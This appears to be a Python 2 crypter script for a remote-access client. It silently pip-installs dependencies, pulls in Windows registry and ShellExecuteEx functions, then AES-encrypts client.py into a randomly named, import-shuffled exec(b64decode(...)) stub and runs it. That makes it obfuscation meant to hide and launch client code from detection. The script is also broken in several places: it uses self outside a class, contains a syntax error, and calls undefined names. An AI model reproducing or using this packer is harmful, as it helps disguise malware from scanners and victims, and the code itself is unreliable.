#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import os
import pip.commands.install as pip
from requests import get
from Crypto.Cipher import AES
from base64 import b64encode,  b64decode


def tempdir():
    for tmp in ['TEMP','TMP','TEMPDIR','TMPDIR']:
        tmpdir = os.getenv(tmp)
        if tmpdir:
            return tmpdir
    if os.name is 'nt':
        for tmp in ["%TEMP%", "%TEMPDIR%", "%TMP%"]:
            tmpdir = os.path.expandvars(tmp)
            if tmpdir != tmp:
                return tmpdir
    else:
        for tmp in ["/tmp", "/var/tmp"]:
            if os.path.isdir(tmp):
                return tmp
    return os.getcwd()

module_info    = [item for item in get('https://api.github.com/repos/colental/AngryEggplant/contents/modules').json() if item['name'] not in globals() if '__' not in item]
dependencies   = {}
dependencies['AES']                = 'Crypto.Cipher'
dependencies['HMAC']               = 'Crypto.Hash'
dependencies['SHA256']             = 'Crypto.Hash'
dependencies['bytes_to_long']      = 'Crypto.Util.number'
dependencies['long_to_bytes']      = 'Crypto.Util.number'                        
dependencies['ShellExecuteEx']     = 'win32com.shell.shell' if os.name is 'nt' else None
dependencies['HKEY_CURRENT_USER']  = '_winreg' if os.name is 'nt' else None
dependencies['KEY_WRITE']          = '_winreg' if os.name is 'nt' else None
dependencies['KEY_ALL_ACCESS']     = '_winreg' if os.name is 'nt' else None
dependencies['REG_SZ']             = '_winreg' if os.name is 'nt' else None
dependencies['CloseKey']           = '_winreg' if os.name is 'nt' else None
dependencies['DeleteValue']        = '_winreg' if os.name is 'nt' else None
dependencies['OpenKey']            = '_winreg' if os.name is 'nt' else None
dependencies['SetValueEx']         = '_winreg' if os.name is 'nt' else None

for module in dependencies:
    try:
        package = dependencies[module]
        if module not in globals():
            try:
                exec "from %s import %s" % (package, module)
            except:
                try:
                    main_package = package.split('.')[0]
                    install = pip.InstallCommand().main([main_package])
                    exec "from %s import %s" % (package, module)
                except Exception as x:
                    pass
    except Exception as e:
        pass



BLOCK_SIZE = 32
PADDING = '{'
imports = list()
output = list()


choice      = lambda items: items[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(items)][0])]
random_var  = lambda: str().join(self.choice([chr(i) for i in range(65, 123) if not 90 < i < 97]) for x in range(3)) + "_" + str().join([self.choice([chr(i) for i in range(48,58)]) for x in range(3)])
output_name = os.path.join(self._tempdir(),  + ext)
pad         = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES   = lambda c, s: b64encode(c.encrypt(pad(s)))
DecodeAES   = lambda c, e: c.decrypt(b64decode(e)).rstrip(PADDING)

output_name = tempfile(ext='.py')

key = os.urandom(32)
iv = os.urandom(16)
code = open('client.py').readlines()

f = open(output_name, 'w')

if os.path.splitext(sys.argv[1])[1] == ".py":
    for line in code:
        if not line.startswith("#"):
            if line.startswith('import') or line.startswith('from'):
                imports.append(line.strip())
            else:
                output.append(line)

    cipherEnc = AES.new(key)
    encrypted = EncodeAES(cipherEnc, str().join(output))
    b64var = self.random_var()
    aesvar = self.random_var()
    imports.append("from base64 import b64decode as %s" %(b64var))
    imports.append("from Crypto.Cipher import AES as %s" %(aesvar))

    shuffled_imports = []
    while True:
        try:
            shuffled_imports.append(items.pop(int([i for i in [ord(os.urandom(1)) for i in range(100)] if i < len(items)][0])))
        except:
            break
        
    f.write(";".join(shuffled_imports) + "\n")
    f.write("exec(%s(\"%s\"))" % (b64var,b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted))))
    f.close()
    execfile(output_name)
    sys.exit(0)


if __name__ == '__main__':
    main()
